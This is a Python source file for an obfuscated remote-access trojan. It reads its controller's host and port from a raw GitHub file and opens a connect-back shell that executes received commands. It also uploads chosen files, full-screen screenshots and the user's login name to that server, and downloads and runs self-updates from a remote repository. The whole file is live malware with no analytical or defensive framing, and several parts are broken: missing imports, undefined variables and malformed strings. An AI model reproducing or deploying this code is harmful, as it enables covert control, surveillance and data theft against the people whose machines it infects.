import sys,subprocess,socket,time,requests
from PIL import ImageGrab
xuLMCdOExamU = "1.29.11.24"
WfQygXj = ""
DlsrxqIpKKFaInmNC = ""
cQmJIjWlR = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
PWSJEPyey = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
CPXscQwZltuopUlKEMFXL = "!"
def connect(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	return s
def process(s):
	data = s.recv(1024)
	if len(data)==0:
		return True
	else:
		AHsZarQPYZXT(s, data.decode("utf-8"))
def AHsZarQPYZXT(s, command):
	if not command.startswith(CPXscQwZltuopUlKEMFXL):
		proc = subprocess.run(data.decode("utf-8"), shell=True, capture_output=True)
		result = proc.stdout + proc.stderr
		s.send(result)
		return
	cmd = command.split(" ")[0][1:]
	if cmd == "download":
		uogdVXJQ(s, command)
	elif cmd == "screenshot":
		MLjclHUkvvHpKDAKnNrXDd(s)
def uogdVXJQ(s, command):
	paths = command.replace(CPXscQwZltuopUlKEMFXL+"screenshot ", "").split(",")
	results = []
	for f in paths:
		results += eGYdGat(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(" ".join(results))
def MLjclHUkvvHpKDAKnNrXDd(command):
	image = ImageGrab.grab(
		bbox=None,
		include_layered_windows=False,
		all_screens=True,
		xdisplay=None
	)
	fpath = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	image.save(fpath)
	image.close()
	r = eGYdGat(fpath, "api/sscap")
	os.remove(fpath)
	s.send(r)
def eGYdGat(filePath, uploadPath, addHeaders=None):
	if not os.path.exists(filePath):
		return "FILE NOT FOUND: "+filePath
	headers = {"user":os.getlogin()}
	if addHeaders is not None:
		headers = {**headers, **addHeaders}
	requests.post(WfQygXj+":"+DlsrxqIpKKFaInmNC+"/"+uploadPath,
		files={open(filePath, "rb")},
		headers=headers)
	return "SUCCESS"
def LVbNybhvUYDzaRp():
	if WfQygXj == "" or DlsrxqIpKKFaInmNC == "":
		data = requests.get(cQmJIjWlR).text.replace("\n","").split(":")
		WfQygXj = data[0].strip()
		DlsrxqIpKKFaInmNC = data[1].strip()
		version = data[2].strip()
	return host, port, version
def mfinkuTzcPJNtlNFTwB():
	currentName = os.path.basename(__file__)
	fileType = currentName.split(".")[-1]
	updateFileName = currentName.replace(fileType,"") +"."+xuLMCdOExamU + fileType
	fullUpdateFilePath = os.path.join(os.path.getcwd(), updateFileName)
	with open(updateFileName, "wb+") as f:
		f.write(requests.get(PWSJEPyey+"/file"+fullUpdateFilePath.split(".")[-1]))
	if executable:
		os.system(".\"+fullUpdateFilePath)
	else:
		os.system("python "+fullUpdateFilePath")
def kaXVRDtOPNEIcrPazBExdQ():
	pass
def gfwkydWTpjSFCCjzMIKin():
	h, p, v = LVbNybhvUYDzaRp()
	if xuLMCdOExamU != v:
		mfinkuTzcPJNtlNFTwB()
	kaXVRDtOPNEIcrPazBExdQ()
	while True:
		try:
			while True:
				socketDied=False
				try:
					s=connect(h, p)
					while not socketDied:
						s.send(b"\n>> ")
						socketDied=process(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
sys.exit(gfwkydWTpjSFCCjzMIKin())
